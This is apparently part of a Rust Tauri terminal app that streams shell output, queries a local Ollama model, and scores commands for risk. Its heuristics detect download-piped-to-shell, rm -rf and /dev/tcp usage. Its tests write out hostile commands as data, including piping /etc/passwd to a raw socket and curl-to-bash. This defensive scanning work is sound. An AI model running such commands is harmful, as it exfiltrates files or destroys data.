        let trimmed = String::from_utf8(trimmed).map_err(|err| err.to_string())?;
        let trimmed = trimmed.trim();
        if trimmed.is_empty() {
            continue;
        }

        let chunk: OllamaResponseChunk =
            serde_json::from_str(trimmed).map_err(|err| err.to_string())?;
        handle_ollama_chunk(app_handle, chunk);
    }

    Ok(())
}

fn handle_ollama_chunk(app_handle: &AppHandle, chunk: OllamaResponseChunk) {
    if let Some(error) = chunk.error {
        emit_ollama_chunk(
            app_handle,
            OllamaChunkPayload {
                content: None,
                done: true,
                error: Some(error),
            },
        );
        return;
    }

    if chunk.done.unwrap_or(false) {
        if let Some(savings) = chunk.eco_savings() {
            emit_eco_savings(app_handle, savings);
        }
    }

    if let Some(message) = chunk.message {
        emit_ollama_chunk(
            app_handle,
            OllamaChunkPayload {
                content: Some(message.content),
                done: chunk.done.unwrap_or(false),
                error: None,
            },
        );
        return;
    }

    if chunk.done.unwrap_or(false) {
        emit_ollama_chunk(
            app_handle,
            OllamaChunkPayload {
                content: None,
                done: true,
                error: None,
            },
        );
    }
}

fn emit_ollama_chunk(app_handle: &AppHandle, payload: OllamaChunkPayload) {
    let _ = app_handle.emit("ollama-chunk", payload);
}

fn spawn_terminal_reader(
    app_handle: AppHandle,
    session_id: String,
    mut reader: Box<dyn Read + Send>,
    snapshots: Arc<Mutex<HashMap<String, TerminalSnapshot>>>,
) -> ReaderHandle {
    let (tx, mut rx) = tokio::sync::mpsc::channel::<String>(100);

    // Emitting from this task instead of the blocking reader coalesces bursts
    // of PTY output into one IPC event per wakeup instead of one per read.
    let emit_session_id = session_id.clone();
    tauri::async_runtime::spawn(async move {
        let mut batch = String::new();
        while let Some(chunk) = rx.recv().await {
            batch.push_str(&chunk);
            while let Ok(next_chunk) = rx.try_recv() {
                batch.push_str(&next_chunk);
            }
            let payload = TerminalOutputPayload {
                session_id: emit_session_id.clone(),
                data: batch.clone(),
            };
            let _ = app_handle.emit("terminal-output", payload);
            let mut guard = snapshots.lock().await;
            if let Some(snapshot) = guard.get_mut(&emit_session_id) {
                snapshot.append(&batch);
            }
            batch.clear();
        }
    });

    tauri::async_runtime::spawn_blocking(move || {
        let mut buf = [0_u8; 4096];
        // Reads can split a multi-byte UTF-8 sequence; carry the incomplete
        // tail over to the next read instead of emitting replacement chars.
        let mut pending: Vec<u8> = Vec::new();
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(len) => {
                    pending.extend_from_slice(&buf[..len]);
                    let chunk = match std::str::from_utf8(&pending) {
                        Ok(valid) => {
                            let chunk = valid.to_string();
                            pending.clear();
                            chunk
                        }
                        Err(err) if err.error_len().is_none() => {
                            let valid_up_to = err.valid_up_to();
                            let chunk =
                                String::from_utf8_lossy(&pending[..valid_up_to]).to_string();
                            pending.drain(..valid_up_to);
                            chunk
                        }
                        Err(_) => {
                            let chunk = String::from_utf8_lossy(&pending).to_string();
                            pending.clear();
                            chunk
                        }
                    };
                    if chunk.is_empty() {
                        continue;
                    }
                    if tx.blocking_send(chunk).is_err() {
                        break;
                    }
                }
                Err(err) => {
                    let _ = tx.blocking_send(format!("[PTY ERROR] {err}"));
                    break;
                }
            }
        }
    })
}

fn normalize_command_heuristics(command: &str) -> String {
    command
        .replace('"', "")
        .replace('\'', "")
        .replace('\\', "")
}

fn is_destructive_rm(command: &str) -> bool {
    let lower = command.to_lowercase();
    for cmd_part in lower.split(|c| c == ';' || c == '&' || c == '|') {
        let trimmed = cmd_part.trim();
        let words: Vec<&str> = trimmed.split_whitespace().collect();
        for (i, &word) in words.iter().enumerate() {
            if word == "rm" {
                let mut has_r = false;
                let mut has_f = false;
                for &arg in words.iter().skip(i + 1) {
                    if arg.starts_with('-') && !arg.starts_with("--") {
                        if arg.contains('r') || arg.contains('R') {
                            has_r = true;
                        }
                        if arg.contains('f') {
                            has_f = true;
                        }
                    } else if arg == "--recursive" {
                        has_r = true;
                    } else if arg == "--force" {
                        has_f = true;
                    }
                }
                if has_r && has_f {
                    return true;
                }
            }
        }
    }
    false
}

fn suspicion_score(command: &str) -> i32 {
    let normalized = normalize_command_heuristics(command);
    let lower = normalized.to_lowercase();
    let mut score = 0;

    if lower.contains("sudo") {
        score += 10;
    }

    if contains_piped_interpreter(&lower) {
        score += 50;
    }

    if is_destructive_rm(&lower) {
        score += 50;
    }

    if lower.contains("base64") {
        score += 10;
    }

    if lower.contains("/dev/tcp") || lower.contains("/dev/udp") {
        score += 30;
    }

    if references_ip(&lower) {
        score += 5;
    }

    score
}

fn collect_heuristic_reasons(command: &str) -> Vec<&'static str> {
    let normalized = normalize_command_heuristics(command);
    let mut reasons = Vec::new();

    if contains_piped_interpreter(&normalized) {
        reasons.push("Downloads remote content and pipes it directly into a shell");
    }

    if is_destructive_rm(&normalized) {
        reasons.push("Contains destructive rm -rf/recursive force deletion");
    }

    if normalized.contains("/dev/tcp") || normalized.contains("/dev/udp") {
        reasons.push("Uses /dev/tcp or /dev/udp for raw network sockets");
    }

    reasons
}

fn contains_piped_interpreter(command: &str) -> bool {
    let lower = command.to_lowercase();
    if !lower.contains('|') {
        return false;
    }
    let downloaders = ["curl", "wget", "fetch"];
    let has_downloader = downloaders.iter().any(|tool| lower.contains(tool));
    if !has_downloader {
        return false;
    }

    for part in lower.split('|').skip(1) {
        let trimmed = part.trim();
        let mut words = trimmed.split_whitespace();
        let mut first_word = words.next().unwrap_or("");
        if first_word == "sudo" {
            first_word = words.next().unwrap_or("");
        }
        let is_interpreter = first_word == "sh"
            || first_word == "bash"
            || first_word == "zsh"
            || first_word == "fish"
            || first_word == "python"
            || first_word == "$shell"
            || first_word.ends_with("/sh")
            || first_word.ends_with("/bash")
            || first_word.ends_with("/zsh")
            || first_word.ends_with("/fish")
            || first_word.ends_with("/python");
        if is_interpreter {
            return true;
        }
    }
    false
}

fn references_ip(command: &str) -> bool {
    command
        .split(|ch: char| !(ch.is_ascii_digit() || ch == '.'))
        .any(is_ipv4_token)
}

fn is_ipv4_token(token: &str) -> bool {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|part| {
        if part.is_empty() || part.len() > 3 {
            return false;
        }
        match part.parse::<u8>() {
            Ok(_) => true,
            Err(_) => false,
        }
    })
}

#[derive(Deserialize)]
struct OllamaResponseChunk {
    message: Option<OllamaMessage>,
    done: Option<bool>,
    error: Option<String>,
    // Inference stats Ollama attaches to the final chunk of a stream.
    prompt_eval_count: Option<u64>,
    eval_count: Option<u64>,
    total_duration: Option<u64>,
}

impl OllamaResponseChunk {
    fn eco_savings(&self) -> Option<EcoSavings> {
        let prompt_tokens = self.prompt_eval_count.unwrap_or(0);
        let output_tokens = self.eval_count.unwrap_or(0);
        if prompt_tokens + output_tokens == 0 {
            return None;
        }
        Some(compute_eco_savings(
            prompt_tokens,
            output_tokens,
            self.total_duration.unwrap_or(0),
        ))
    }
}

#[derive(Deserialize)]
struct OllamaMessage {
    #[allow(dead_code)]
    role: String,
    content: String,
}

#[derive(Deserialize)]
struct OllamaTagsResponse {
    models: Vec<OllamaTagModel>,
}

#[derive(Deserialize)]
struct OllamaTagModel {
    name: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Eco savings ---------------------------------------------------------

    #[test]
    fn eco_savings_sums_prompt_and_output_tokens() {
        let savings = compute_eco_savings(300, 700, 0);
        assert_eq!(savings.tokens, 1000);
    }

    #[test]
    fn eco_savings_scale_with_token_count() {
        // 1000 tokens with zero local runtime saves exactly the cloud estimate.
        let savings = compute_eco_savings(500, 500, 0);
        assert!((savings.energy_wh - CLOUD_WH_PER_1K_TOKENS).abs() < 1e-9);
        assert!((savings.co2_g - CLOUD_WH_PER_1K_TOKENS * CO2_G_PER_WH).abs() < 1e-9);
        assert!((savings.water_ml - CLOUD_WH_PER_1K_TOKENS * WATER_ML_PER_WH_CLOUD).abs() < 1e-9);
    }

    #[test]
    fn eco_savings_never_go_negative() {
        // A tiny reply that took an hour of local compute costs more energy
        // than the cloud would have; savings must clamp to zero, not dip below.
        let one_hour_ns = 3_600_000_000_000;
        let savings = compute_eco_savings(5, 5, one_hour_ns);
        assert_eq!(savings.energy_wh, 0.0);
        assert_eq!(savings.co2_g, 0.0);
        assert_eq!(savings.water_ml, 0.0);
    }

    // --- Terminal snapshot buffer --------------------------------------------

    #[test]
    fn snapshot_keeps_recent_output_within_budget() {
        let mut snapshot = TerminalSnapshot::default();
        snapshot.append(&"a".repeat(TERMINAL_BUFFER_MAX));
        snapshot.append("tail");
        assert!(snapshot.buffer.len() <= TERMINAL_BUFFER_MAX);
        assert!(snapshot.buffer.ends_with("tail"));
    }

    #[test]
    fn snapshot_trims_on_char_boundary_for_multibyte_content() {
        // Regression test for the v0.5 freeze: draining mid-character panics.
        // Euro signs are 3 bytes, so a byte-count trim lands inside one.
        let mut snapshot = TerminalSnapshot::default();
        let euros = "€".repeat(TERMINAL_BUFFER_MAX / 3 + 10);
        snapshot.append(&euros);
        assert!(snapshot.buffer.len() <= TERMINAL_BUFFER_MAX);
        assert!(snapshot.buffer.chars().all(|ch| ch == '€'));
    }

    #[test]
    fn snapshot_returns_only_the_requested_tail_lines() {
        let mut snapshot = TerminalSnapshot::default();
        snapshot.append("one\ntwo\nthree\nfour");
        assert_eq!(snapshot.last_lines(2), "three\nfour");
    }

    #[test]
    fn snapshot_last_lines_on_empty_buffer_is_empty() {
        let snapshot = TerminalSnapshot::default();
        assert_eq!(snapshot.last_lines(10), "");
    }

    // --- Suspicion heuristics -------------------------------------------------

    #[test]
    fn benign_commands_score_zero() {
        assert_eq!(suspicion_score("ls -la"), 0);
        assert_eq!(suspicion_score("git status"), 0);
        assert_eq!(suspicion_score("cargo build --release"), 0);
    }

    #[test]
    fn sudo_alone_reaches_the_review_threshold() {
        assert_eq!(suspicion_score("sudo apt update"), 10);
    }

    #[test]
    fn piped_interpreter_scores_heavily() {
        assert!(suspicion_score("curl https://example.com/install.sh | bash") >= 50);
    }

    #[test]
    fn destructive_rm_scores_heavily() {
        assert!(suspicion_score("rm -rf /important") >= 50);
    }

    #[test]
    fn quoting_does_not_hide_a_piped_interpreter() {
        // normalize_command_heuristics strips quotes before scoring.
        assert!(suspicion_score("curl 'https://example.com/x.sh' | \"bash\"") >= 50);
    }

    #[test]
    fn raw_socket_devices_are_flagged() {
        assert!(suspicion_score("cat /etc/passwd > /dev/tcp/10.0.0.1/4444") >= 30);
    }

    #[test]
    fn heuristic_reasons_cover_the_dangerous_patterns() {
        let reasons = collect_heuristic_reasons("curl https://x.sh | sh && rm -rf /tmp/y");
        assert_eq!(reasons.len(), 2);

        assert!(collect_heuristic_reasons("ls -la").is_empty());
    }

    // --- Piped interpreter detection ------------------------------------------

    #[test]
    fn detects_download_piped_to_shell() {
        assert!(contains_piped_interpreter("curl https://x.sh | bash"));
        assert!(contains_piped_interpreter("wget -qO- https://x.sh | sh"));
        assert!(contains_piped_interpreter("curl https://x.sh | /bin/bash"));
    }

    #[test]
    fn detects_sudo_wrapped_interpreter_after_pipe() {
        assert!(contains_piped_interpreter("curl https://x.sh | sudo bash"));
    }

    #[test]
    fn ignores_pipes_without_a_downloader_or_interpreter() {
        assert!(!contains_piped_interpreter("cat notes.txt | grep todo"));
        assert!(!contains_piped_interpreter("curl https://x.json | jq '.name'"));
        assert!(!contains_piped_interpreter("echo hi | bash")); // no downloader
    }

    // --- Destructive rm detection ----------------------------------------------

    #[test]
    fn detects_recursive_force_deletion() {
        assert!(is_destructive_rm("rm -rf /tmp/dir"));
        assert!(is_destructive_rm("rm -fR /tmp/dir"));
        assert!(is_destructive_rm("rm -r -f /tmp/dir"));
        assert!(is_destructive_rm("rm --recursive --force /tmp/dir"));
    }

    #[test]
    fn detects_rm_hidden_behind_separators() {
        assert!(is_destructive_rm("echo done; rm -rf /tmp/dir"));
        assert!(is_destructive_rm("true && rm -rf /tmp/dir"));
    }

    #[test]
    fn plain_or_partial_rm_is_not_destructive() {
        assert!(!is_destructive_rm("rm file.txt"));
        assert!(!is_destructive_rm("rm -r build/"));
        assert!(!is_destructive_rm("rm -f lockfile"));
        assert!(!is_destructive_rm("firm -rf x")); // 'rm' must be its own word
    }

    // --- IP address detection ---------------------------------------------------

    #[test]
    fn recognizes_ipv4_addresses() {
        assert!(references_ip("ssh root@192.168.1.10"));
        assert!(references_ip("curl http://10.0.0.1/payload"));
    }

    #[test]
    fn ignores_version_numbers_and_invalid_octets() {
        assert!(!references_ip("pip install requests==2.31.0"));
        assert!(!references_ip("curl 999.1.1.1")); // octet out of range
        assert!(!references_ip("node@20.11.1"));
    }

    #[test]
    fn ipv4_token_requires_exactly_four_valid_octets() {
        assert!(is_ipv4_token("127.0.0.1"));
        assert!(!is_ipv4_token("1.2.3"));
        assert!(!is_ipv4_token("1.2.3.4.5"));
        assert!(!is_ipv4_token("1..3.4"));
        assert!(!is_ipv4_token("1.2.3.1000"));
    }

    // --- Preflight report parsing -----------------------------------------------

    fn valid_report_json() -> &'static str {
        r#"{"summary": "Lists files", "is_risky": false, "risk_reason": "Read-only listing"}"#
    }

    #[test]
    fn parses_clean_json_report() {
        let report = parse_preflight_report(valid_report_json()).expect("should parse");
        assert_eq!(report.summary, "Lists files");
        assert!(!report.is_risky);
        assert!(report.safe_alternative.is_none());
    }

    #[test]
    fn parses_report_wrapped_in_code_fence() {
        let fenced = format!("```json\n{}\n```", valid_report_json());
        let report = parse_preflight_report(&fenced).expect("should parse fenced JSON");
        assert_eq!(report.summary, "Lists files");
    }

    #[test]
    fn parses_report_embedded_in_prose() {
        let chatty = format!("Sure! Here is the analysis:\n{}\nLet me know!", valid_report_json());
        let report = parse_preflight_report(&chatty).expect("should extract embedded JSON");
        assert_eq!(report.summary, "Lists files");
    }

    #[test]
    fn repairs_missing_commas_between_fields() {
        let sloppy = "{\n\"summary\": \"Deletes files\"\n\"is_risky\": true\n\"risk_reason\": \"Destroys data\"\n}";
        let report = parse_preflight_report(sloppy).expect("should repair missing commas");
        assert!(report.is_risky);
        assert_eq!(report.risk_reason, "Destroys data");
    }

    #[test]
    fn accepts_json5_style_single_quotes() {
        let json5_style =
            "{summary: 'Pings a host', is_risky: false, risk_reason: 'Simple ICMP check'}";
        let report = parse_preflight_report(json5_style).expect("should parse JSON5");
        assert_eq!(report.summary, "Pings a host");
    }

    #[test]
    fn repairs_double_quotes_inside_backticks() {
        let nested = r#"{"summary": "Runs `"rm"` on a path", "is_risky": true, "risk_reason": "Deletion"}"#;
        let report = parse_preflight_report(nested).expect("should repair backtick quotes");
        assert!(report.summary.contains("'rm'"));
    }

    #[test]
    fn rejects_unusable_output() {
        assert!(parse_preflight_report("I cannot analyze that command.").is_err());
        assert!(parse_preflight_report("").is_err());
    }

    // --- Fence / JSON extraction helpers ------------------------------------------

    #[test]
    fn strip_code_fence_handles_json_and_bare_fences() {
        assert_eq!(strip_code_fence("```json\n{\"a\":1}\n```").as_deref(), Some("{\"a\":1}"));
        assert_eq!(strip_code_fence("```\ntext\n```").as_deref(), Some("text"));
        assert_eq!(strip_code_fence("no fence here"), None);
    }

    #[test]
    fn extract_json_object_returns_outermost_braces() {
        let raw = "prefix {\"a\": {\"nested\": true}} suffix";
        assert_eq!(extract_json_object(raw).as_deref(), Some("{\"a\": {\"nested\": true}}"));
        assert_eq!(extract_json_object("no braces"), None);
        assert_eq!(extract_json_object("{unclosed"), None);
    }

    #[test]
    fn insert_missing_commas_leaves_valid_json_alone() {
        assert_eq!(insert_missing_commas("{\n\"a\": 1,\n\"b\": 2\n}"), None);
    }

    // --- Plain-text assessment fallback ---------------------------------------------

    #[test]
    fn converts_three_line_assessment_to_report() {
        let text = "Summary: Lists directory contents\nLikelihood of maliciousness: 5%\nRationale: Read-only and harmless";
        let report = assessment_text_to_report(text).expect("should build report");
        assert_eq!(report.summary, "Lists directory contents");
        assert!(!report.is_risky); // 5% is under the 20% threshold
        assert!(report.risk_reason.contains("very low"));
    }

    #[test]
    fn high_likelihood_marks_report_risky() {
        let text = "Summary: Pipes remote script to bash\nLikelihood of maliciousness: 85%\nRationale: Executes unreviewed code";
        let report = assessment_text_to_report(text).expect("should build report");
        assert!(report.is_risky);
        assert!(report.risk_reason.contains("high"));
    }

    #[test]
    fn missing_likelihood_defaults_to_risky() {
        let text = "Summary: Unknown binary execution\nRationale: Cannot determine behavior";
        let report = assessment_text_to_report(text).expect("should build report");
        assert!(report.is_risky);
    }

    #[test]
    fn recommendation_line_becomes_safe_alternative() {
        let text = "Summary: Force-deletes a directory\nLikelihood of maliciousness: 60%\nRationale: Irreversible\nRecommendation: Move it to the trash instead";
        let report = assessment_text_to_report(text).expect("should build report");
        assert_eq!(report.safe_alternative.as_deref(), Some("Move it to the trash instead"));
    }

    #[test]
    fn empty_assessment_yields_no_report() {
        assert!(assessment_text_to_report("").is_none());
        assert!(assessment_text_to_report("\n  \n").is_none());
    }

    #[test]
    fn sanitize_assessment_strips_fences_and_echoed_context() {
        let raw = "```\nSummary: fine\nCommand to review: ls\nRationale: safe\n```";
        let cleaned = sanitize_plain_text_assessment(raw);
        assert!(cleaned.contains("Summary: fine"));
        assert!(!cleaned.contains("Command to review"));
    }

    #[test]
    fn parse_percentage_accepts_common_formats() {
        assert_eq!(parse_percentage("85%"), Some(85.0));
        assert_eq!(parse_percentage(" 42 % "), Some(42.0));
        assert_eq!(parse_percentage("12.5"), Some(12.5));
        assert_eq!(parse_percentage("unknown"), None);
    }

    #[test]
    fn normalize_strips_quotes_and_escapes() {
        assert_eq!(normalize_command_heuristics(r#"echo "hi \'there\'""#), "echo hi there");
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .manage(AppState::default())
        .plugin(tauri_plugin_opener::init())
        .setup(|app| {
            if let Some(window) = app.get_webview_window("main") {
                if let Some(icon) = app.default_window_icon().cloned() {
                    if let Err(err) = window.set_icon(icon) {
                        eprintln!("failed to set window icon: {err}");
                    }
                }
            }
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            spawn_pty,
            write_to_pty,
            resize_pty,
            ask_ollama,
            check_ollama,
            list_ollama_models,
            get_terminal_context,
            get_system_context,
            analyze_command,
            close_pty
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
